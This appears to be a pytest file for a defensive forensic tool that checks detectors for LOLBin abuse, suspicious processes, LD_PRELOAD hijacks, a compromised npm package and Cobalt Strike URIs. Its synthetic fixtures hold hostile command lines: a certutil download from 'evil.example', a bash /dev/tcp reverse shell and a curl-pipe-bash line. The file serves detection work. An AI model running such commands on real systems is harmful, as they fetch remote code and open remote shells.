"""Detector tests with synthetic artifacts."""

from __future__ import annotations

from pathlib import Path

from digger.core import Artifact, EvidenceStore
from digger.detectors.c2 import C2Detector
from digger.detectors.env_hijack import EnvHijackDetector
from digger.detectors.lolbins import LolbinDetector
from digger.detectors.shai_hulud import ShaiHuludDetector
from digger.detectors.suspicious_processes import SuspiciousProcessDetector


def _store_with_processes(tmp_path: Path, procs: list[dict]) -> EvidenceStore:
    store = EvidenceStore(tmp_path)
    for p in procs:
        store.add_artifact(Artifact(collector="processes", category="process",
                                    subject=f"pid={p['pid']}", data=p))
    return store


def test_lolbin_detector_catches_certutil_download(tmp_path: Path):
    store = _store_with_processes(tmp_path, [{
        "pid": 100, "ppid": 1, "name": "certutil.exe", "exe": "C:\\Windows\\System32\\certutil.exe",
        "cmdline": ["certutil.exe", "-urlcache", "-split", "-f", "https://evil.example/x.exe", "x.exe"],
    }])
    n = LolbinDetector().run(store)
    assert n >= 1
    found = list(store.iter_findings())
    assert any("certutil" in f["title"].lower() for f in found)
    store.close()


def test_lolbin_detector_catches_bash_dev_tcp(tmp_path: Path):
    store = _store_with_processes(tmp_path, [{
        "pid": 200, "ppid": 1, "name": "bash", "exe": "/bin/bash",
        "cmdline": ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
    }])
    LolbinDetector().run(store)
    found = list(store.iter_findings())
    assert found
    store.close()


def test_suspicious_process_catches_curl_pipe_bash(tmp_path: Path):
    store = _store_with_processes(tmp_path, [{
        "pid": 300, "ppid": 1, "name": "sh", "exe": "/bin/sh",
        "cmdline": ["sh", "-c", "curl -fsSL https://example.com/install.sh | bash"],
    }])
    SuspiciousProcessDetector().run(store)
    found = list(store.iter_findings())
    assert any("pipe" in f["title"].lower() or "encoded" in f["title"].lower() or "shell" in f["title"].lower() for f in found)
    store.close()


def test_env_hijack_detector_catches_ld_preload(tmp_path: Path):
    store = EvidenceStore(tmp_path)
    store.add_artifact(Artifact(
        collector="env", category="environment", subject="interesting",
        data={"values": {"LD_PRELOAD": "/tmp/evil.so", "PATH": "/usr/bin:/usr/local/bin"}},
    ))
    EnvHijackDetector().run(store)
    found = list(store.iter_findings())
    assert any("LD_PRELOAD" in f["title"] for f in found)
    store.close()


def test_shai_hulud_detector_catches_compromised_chalk(tmp_path: Path):
    store = EvidenceStore(tmp_path)
    store.add_artifact(Artifact(
        collector="npm_packages", category="inventory", subject="npm:/proj",
        data={
            "project": "/proj",
            "locked_packages": {"chalk": "5.6.1"},
            "declared_deps": {},
            "declared_dev_deps": {},
        },
    ))
    ShaiHuludDetector().run(store)
    found = list(store.iter_findings())
    assert any("chalk@5.6.1" in f["title"] for f in found)
    store.close()


def test_c2_detector_catches_cobaltstrike_uri(tmp_path: Path):
    store = EvidenceStore(tmp_path)
    store.add_artifact(Artifact(
        collector="browsers", category="browser", subject="chrome.history:p/Default",
        data={"entries": [{"url": "https://example.com/aaa9", "title": "x", "visits": 1, "last_visit_chrome": 0}]},
    ))
    C2Detector().run(store)
    found = list(store.iter_findings())
    assert any("Cobalt" in f["title"] for f in found)
    store.close()
